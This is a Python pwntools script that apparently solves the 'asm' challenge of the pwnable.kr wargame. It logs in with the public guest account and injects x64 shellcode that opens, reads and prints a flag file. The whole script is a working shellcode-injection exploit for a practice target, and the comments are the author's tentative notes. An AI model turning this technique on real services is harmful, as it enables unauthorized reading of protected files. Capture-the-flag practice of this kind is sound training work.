from pwn import *

connection = ssh(host ='pwnable.kr', user='asm', password='guest', port=2222)
p = connection.connect_remote('localhost', 9026)

context.arch="amd64"

shellcode = ''
shellcode = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')

# file name has been pushed to the top of the stack
# so you can use the stack pointer (rsp) to reference
# the filename

shellcode += shellcraft.open('rsp', 0, 0)

# return value from open (the fildes) is stored on the
# (rax)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

# second argument for .read() and .write() points to 
# the buf where text from fd is read/written into.
# can 'assume' that the stack is a safe place to access?

p.recvuntil('give me your x64 shellcode:')
p.sendline(asm(shellcode))
log.success(p.recvline())
